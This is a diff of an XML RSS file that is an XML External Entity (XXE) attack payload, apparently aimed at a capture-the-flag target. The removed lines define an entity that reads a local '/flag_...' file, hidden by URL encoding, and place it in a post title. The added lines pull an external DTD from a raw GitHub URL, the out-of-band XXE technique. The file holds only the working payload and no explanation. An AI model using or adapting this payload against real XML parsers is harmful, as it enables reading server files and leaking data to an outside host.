@@ -1,17 +1,25 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE msg [
-	<!ELEMENT msg ANY >
-	<!ENTITY xxe SYSTEM "%2f%66%6c%61%67%5f%38%64%34%37%37%31%30%63%33%35%61%31%37%64%31%37%66%62%66%36%63%66%31%35%34%62%30%35%34%63%65%65" >
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ELEMENT rss ANY>
+  <!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
+  %sp;
 ]>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-<channel>
-    <title>The Blog</title>
-    <description>A blog about things</description>
-    <link>http://example.com/</link>
-<item>
-        <title>&xxe;</title>
-        <description>a post</description>
-        <link>http://example.com</link>
-    </item>
-</channel>
+<rss>
+    <channel>
+        <item>
+            <title>
+               &data;
+               title
+            </title>
+            <link>
+                hello
+            </link>
+            <description>
+                lol
+            </description>
+            <pubDate>
+                pubdate
+            </pubDate>
+        </item>
+    </channel>
 </rss>
